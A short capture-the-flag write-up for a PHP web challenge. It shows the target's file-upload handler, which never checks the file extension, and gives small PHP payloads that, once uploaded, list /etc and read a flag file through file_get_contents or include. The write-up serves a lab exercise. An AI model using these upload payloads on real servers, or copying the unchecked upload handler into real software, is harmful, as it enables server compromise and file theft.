# Web/WTF PHP writeup

The webpage only contains a file upload box, which instantly captures my attention as a possible weakness. Checking the source code reveals that there is no client-side checking of extensions, only that the file must be smaller than 1MB.

``` php+HTML

<html>
   <body>
      <form action="" method="POST" enctype="multipart/form-data">
         <input type="file" name="fileData" />
         <input type="submit"/>
      </form>
   </body>
<!--
   if(isset($_FILES['fileData'])){
      if($_FILES['fileData']['size'] > 1048576){
         $errors='File size should be less than 1 MB';
      }

      if(empty($errors)==true){
        $uploadedPath = "uploads/".rand().".".explode(".",$_FILES['fileData']['name'])[1];
        move_uploaded_file($_FILES['fileData']['tmp_name'],$uploadedPath);
        echo "File uploaded successfully\n";
        echo '<p><a href='. $uploadedPath .' target="_blank">File</a></p>';
      }else{
         echo $errors;
      }
   }
-->

</html>

```

Knowing that the file is somewhere in `/etc`, we can upload a simple PHP file:

```php
<?php
echo implode(' ', scandir("/etc"));
?>
```

This returns a list of files in `/etc` , where we can see `f1@g.txt`, which is the flag we want. Knowing that, we can upload either of the following files to extract the code.

```php
<?php
echo file_get_contents('/etc/f1@g.txt');
?>
```

```php
<?php
include "/etc/f1@g.txt";
?>
```

This gives us the flag

`darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}`